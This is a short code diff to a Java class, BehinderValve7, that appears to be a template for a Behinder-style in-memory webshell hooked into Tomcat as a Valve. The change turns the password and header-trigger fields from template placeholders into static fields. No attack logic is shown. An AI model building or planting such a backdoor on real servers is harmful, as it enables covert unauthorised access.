@@ -19,9 +19,9 @@ import java.util.Map;
  * @since 2024/12/21
  */
 public class BehinderValve7 extends ClassLoader implements Valve {
-    public String pass = "{{pass}}";
-    public String headerName = "{{headerName}}";
-    public String headerValue = "{{headerValue}}";
+    public static String pass;
+    public static String headerName;
+    public static String headerValue;
     protected Valve next;
     protected boolean asyncSupported;
 
